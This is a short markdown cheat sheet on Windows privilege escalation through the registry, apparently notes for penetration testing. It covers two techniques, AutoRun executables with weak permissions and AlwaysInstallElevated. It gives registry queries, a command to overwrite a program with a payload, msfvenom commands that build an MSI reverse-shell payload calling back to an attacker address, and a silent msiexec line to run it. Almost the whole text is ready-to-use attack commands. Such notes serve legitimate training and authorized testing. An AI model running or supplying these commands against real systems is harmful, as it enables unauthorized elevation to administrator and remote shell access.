# Registry - Privilege Escalation

## AutoRuns

List the registry for AutoRun executables:

	wmic startup get caption,command 

	reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
	reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run

Check if weak permissions on the executables:

    copy C:\payload.exe "C:\Program Files\program.exe" /Y

Trigger:

    reboot 

or create a new rdp session:

    rdesktop R_IP_ADDRESS

## AlwaysInstallElevated

Check the registry for AlwaysInstallElevated keys:

    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

Make windows installer payload (MSI):

    msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP_ADDRESS LPORT=PORT -f msi -o payload.msi
    msfvenom -p windows/shell_reverse_tcp LHOST=IP_ADDRESS LPORT=PORT -f msi -o payload.msi

Trigger payload:

    msiexec /quiet /qn /i C:\payload.msi